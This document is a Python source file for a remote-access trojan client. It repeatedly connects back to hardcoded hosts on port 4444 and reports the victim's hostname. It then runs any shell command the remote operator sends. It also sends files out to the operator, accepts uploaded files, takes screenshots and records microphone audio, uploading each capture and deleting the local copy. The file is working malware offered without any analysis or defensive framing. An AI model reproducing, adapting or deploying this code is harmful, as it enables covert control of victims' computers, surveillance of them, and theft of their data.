import os
import socket
import subprocess
import time
import webbrowser 
import pyautogui
import time
from datetime import timezone, datetime, timedelta
import pyaudio
import wave
import cv2
import shutil
import sqlite3
import sys
import base64
import platform

def receive_commands():
    while True:
        data = s.recv(20480)
        if data[:2].decode('utf-8') == 'cd':
            try:
                directory = data[3:].decode('utf-8').strip()
                os.chdir(directory)
                s.send(str.encode("Directory changed to: " + os.getcwd()))
            except Exception as e:
                error_msg = "Failed to change directory: " + str(e)
                s.send(str.encode(error_msg))
        elif data[:].decode('utf-8') == 'quit':
            s.close()
            break
        elif data[:].decode('utf-8').startswith('browse'):
            url = data[7:].decode('utf-8').strip()
            webbrowser.open(url)
            s.send(b'Browsing completed')
            receive_commands()
        elif data[:].decode('utf-8').startswith('download'):
            filename = data[9:].decode('utf-8').strip()
            download_file(filename)
            receive_commands()
        elif data[:].decode('utf-8').startswith('upload'):
            filename = data[7:].decode('utf-8').strip()
            upload_file(filename)
        elif data[:].decode('utf-8').startswith('screenshot'):
            filename = data[11:].decode('utf-8').strip()
            screenshot(filename)
        elif data[:].decode('utf-8').startswith('record'):
            filename = data[7:].decode('utf-8').strip()
            seconds = int(data[4:].decode("utf-8").split(" ")[2].rstrip())
            recording(filename,seconds)
        elif len(data) > 0:
            try:
                cmd = subprocess.Popen(data[:].decode('utf-8'), shell=True, stdout=subprocess.PIPE,
                                       stderr=subprocess.PIPE, stdin=subprocess.PIPE)
                output_bytes = cmd.stdout.read() + cmd.stderr.read()
                output_str = str(output_bytes, 'utf-8')
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)
            except:
                output_str = 'Command not recognized' + '\n'
                s.send(str.encode(output_str + str(os.getcwd()) + '> '))
                print(output_str)

    s.close()


def download_file(filename):
    try:
        if os.path.exists(filename):
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                with open(filename, 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))


def upload_file(filename):
    try:
        s.send(str.encode(filename))
        response = s.recv(1024).decode()
        if response == 'FileNotFound':
            print('File not found on the remote server')
        else:
            with open(filename, 'wb') as file:
                while True:
                    data = s.recv(1024)
                    if data == b'Done':
                        print('File downloaded successfully')
                        break
                    file.write(data)
    except Exception as e:
        print('Error occurred while downloading the file:', str(e))



def screenshot(filename):
    pic = pyautogui.screenshot()
    #filename = filename + '.png' 
    pic.save(filename)
    try:
        
        if os.path.exists(filename):
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                with open(filename, 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
                os.remove(filename)
        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))


def recording(filename,seconds):
    chunk = 1024
    sample_format = pyaudio.paInt16
    chanels = 2
    smpl_rt = 44400
    pa = pyaudio.PyAudio()

    stream = pa.open(format=sample_format, channels = chanels,
                 rate = smpl_rt, input=True,
                 frames_per_buffer=chunk)

    print('Recording....')
    frames = []

    for i in range(0, int(smpl_rt / chunk * seconds)):
        data = stream.read(chunk)
        frames.append(data)
    stream.stop_stream()
    stream.close()

    pa.terminate()

    print('Done !!! ')

    sf = wave.open(filename, 'wb')
    sf.setnchannels(chanels)
    sf.setsampwidth(pa.get_sample_size(sample_format))
    sf.setframerate(smpl_rt)
    sf.writeframes(b''.join(frames))
    sf.close()
    try:
        
        if os.path.exists(filename):
            s.send(b'Exists')
            response = s.recv(1024).decode()
            if response == 'FileExists':
                print('File already exists on the remote server')
            else:
                with open(filename, 'rb') as file:
                    while True:
                        data = file.read(1024)
                        if not data:
                            break
                        s.sendall(data)
                time.sleep(0.5)
                s.send(b'Done')
                print('File uploaded successfully')
                os.remove(filename)
        else:
            s.send(b'NotFound')
            print('File not found on the local machine')
    except Exception as e:
        print('Error occurred while uploading the file:', str(e))


def main():
    global s
    hosts = ['192.168.141.247', '127.0.0.1']
    port = 4444
    while True:
        for host in hosts:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((host, port))
                hostname = socket.gethostname()
                s.send(hostname.encode())
                receive_commands()
            except Exception:
                pass
                #print('Error in main')
                #time.sleep(5)
                #s.close()
                #main()


main()
